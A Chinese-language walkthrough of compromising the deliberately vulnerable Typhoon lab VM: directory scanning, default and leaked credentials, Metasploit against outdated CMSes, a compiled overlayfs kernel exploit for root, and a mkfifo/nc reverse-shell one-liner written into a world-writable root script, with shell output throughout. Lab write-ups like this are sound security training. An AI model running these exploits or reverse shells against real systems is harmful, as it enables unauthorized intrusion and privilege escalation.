    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
    -----------------    
    GENERATED WORDS: 4612                                                          
    ---- Scanning URL: http://192.168.2.149/ ----    ==> DIRECTORY: http://192.168.2.149/assets/                                    
    ==> DIRECTORY: http://192.168.2.149/calendar/                                  
    + http://192.168.2.149/cgi-bin/ (CODE:403|SIZE:288)                            
    ==> DIRECTORY: http://192.168.2.149/cms/                                       
    ==> DIRECTORY: http://192.168.2.149/drupal/                                    
    + http://192.168.2.149/index.html (CODE:200|SIZE:3529)                         
    ==> DIRECTORY: http://192.168.2.149/javascript/                                
    ==> DIRECTORY: http://192.168.2.149/phpmyadmin/                                
    + http://192.168.2.149/robots.txt (CODE:200|SIZE:37)
# 入侵靶机
## PHPMOADMIN
访问`/robots.txt`，是一个mogondb的WebUI管理，
    User-agent: *
    Disallow: /mongoadmin/
访问`http://192.168.2.149/mongoadmin/`。
查看版本号。`http://192.168.2.149/mongoadmin/index.php?action=getStats`
    version
    mongo: 3.0.15 (64-bit)
    mongoPhpDriver: 1.6.16
    phpMoAdmin: 1.0.9
    php: 5.5.9-1ubuntu4.26 (64-bit)
    gitVersion: b8ff507269c382bc100fc52f75f48d54cd42ec3b
是`1.0.9`。Google搜一搜，没想到一搜就是两个RCE的payload（捂脸.jpg）。
顺利getshell。
## SSH
回过来看一下数据库里的数据。在`credentials`表发现了一列账号密码。
尝试SSH登录。
    root@Shockwave:~# ssh PI:EMAIL
    The authenticity of host '192.168.2.149 (192.168.2.149)' can't be established.
    ECDSA key fingerprint is SHA256:fLv3o4p7wR+3hFFRGmT0UpswxJ2eN6BWXE/aM64mHlo.
    Are you sure you want to continue connecting (yes/no)? yes
    Warning: Permanently added '192.168.2.149' (ECDSA) to the list of known hosts.
        d888888b db    db d8888b. db   db  .d88b.   .d88b.  d8b   db 
        `~~88~~' `8b  d8' 88  `8D 88   88 .8P  Y8. .8P  Y8. 888o  88 
           88     `8bd8'  88oodD' 88ooo88 88    88 88    88 88V8o 88 
           88       88    88~~~   88~~~88 88    88 88    88 88 V8o88 
           88       88    88      88   88 `8b  d8' `8b  d8' 88  V888 
           YP       YP    88      YP   YP  `Y88P'   `Y88P'  VP   V8P 
                     Vulnerable VM By PRISMA CSI - www.prismacsi.com
    WARNING:  Unauthorized access to this system is forbidden and will be
    prosecuted by law. By accessing this system, you agree that your actions
    may be monitored if unauthorized usage is suspected.
            This is a joke of course :))
            Please hack me!
    -----------------------------------------------------------------------    PI:EMAIL's password: 
    Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64)
     * Documentation:  https://help.ubuntu.com/
      System information as of Tue Dec 18 00:08:11 EET 2018
      System load: 0.08               Memory usage: 3%   Processes:       385
      Usage of /:  41.8% of 17.34GB   Swap usage:   0%   Users logged in: 0
      Graph this data and manage this system at:
        https://landscape.canonical.com/
    Last login: Mon Dec 10 12:23:58 2018 from 192.168.7.41
    typhoon@typhoon:~$ whoami
    typhoon
    typhoon@typhoon:~$ sudo -i
    [sudo] password for typhoon: 
    typhoon is not in the sudoers file.  This incident will be reported.
登陆成功，但是typhoon用户并没有超级用户权限。
## Tomcat Manager
访问8080端口，登录manager webapp。尝试默认用户名和密码`tomcat`登录。
登录成功，上msf。
## Drupal CMS & Lotus CMS
`http://192.168.2.149/drupal/`
`http://192.168.2.149/cms/`
这两个CMS都是有问题的版本，就直接用msf的payload打了。
## 其他
另外还可以通过`/dvwa/`、`/xvwa/`的命令注入练习getshell，系统都是默认账号和密码。
dvwa的是admin/password，xvwa的是admin/admin。
也可以登录`/phpmyadmin/`后台，通过包含日志的方式getshell，登录密码为默认的`toor`（也可以通过泄露的`/dvwa/config/config.inc.php.bak`备份文件查看密码）。
具体方式不再展开说了，有兴趣的同学可以自己尝试一下。
# 提权过程
## 利用内核
查看系统版本、内核信息：
    typhoon@typhoon:~$ uname -a
    Linux typhoon.local 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
    typhoon@typhoon:~$ lsb_release -a
    No LSB modules are available.
    Distributor ID: Ubuntu
    Description:    Ubuntu 14.04.1 LTS
    Release:    14.04
    Codename:   trusty
系统是Ubuntu14.04，内核版本为3.13.0，`searchsploit`搜一下相关漏洞。
对应的系统、内核刚好有一个利用overlayfs的exploit，下下来放到靶机上。
    # 复制exploit到当前目录
    root@Shockwave:~/exploits# searchsploit -m 37292.c
      Exploit: Linux Kernel 3.13.0 ] 5,119       --.-K/s   in 0s      
    2018-12-18 11:29:56 (362 MB/s) - ‘37292.c’ saved [5119/5119]
编译、赋权、运行一条龙。
    typhoon@typhoon:~$ gcc 37292.c -o exploit
    typhoon@typhoon:~$ chmod a+x exploit 
    typhoon@typhoon:~$ ./exploit 
    spawning threads
    mount #1
    mount #2
    child threads done
    /etc/ld.so.preload created
    creating shared library
    # id
    uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),112(sambashare),125(libvirtd),1000(typhoon)
    # whoami
    root
    # cat /root/root-flag
    Typhoon_r00t3r!
    #
可以看到顺利提权成功。通过内核提取最方便、快捷，但是局限性也很大。
## 利用可写文件
翻查目录文件，在/tab/目录下发现一个文件所有者为root、权限为777的sh文件。
    typhoon@typhoon:/tab$ ls -al
    total 12
    drwxr-xr-x  2 root root 4096 Dec 17 16:48 .
    drwxr-xr-x 25 root root 4096 Oct 24 04:59 ..
    -rwxrwxrwx  1 root root   71 Dec 17 16:48 script.sh
    typhoon@typhoon:/tab$ cat script.sh 
    echo "Typhoon is UP!"
    # P0st_3xpl01t3R_flaqGq 
用低权限用户将构造的命令写入script.sh，令文件调用以root身份运行的`/bin/sh`，然后反弹shell，就可以获得root权限了。
写入反弹shell命令到`script.sh`中并执行。
    typhoon@typhoon:/tab$ echo "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.92.104 8888 >/tmp/f" > script.sh 
    typhoon@typhoon:/tab$ ./script.sh
在服务器上开启监听，接收到shell。
    root@Shockwave:~/exploits# nc -lvvp 8888
    listening on [any] 8888 ...
    192.168.92.121: inverse host lookup failed: Unknown host
    connect to [192.168.92.104] from (UNKNOWN) [192.168.92.121] 58239
    /bin/sh: 0: can't access tty; job control turned off
    # # 
    # ls
    root-flag
    # id
    uid=0(root) gid=0(root) groups=0(root)
    # whoami
    root
    # ls
    root-flag
    # cat root-flag
    Typhoon_r00t3r!
至此提权成功，利用完成。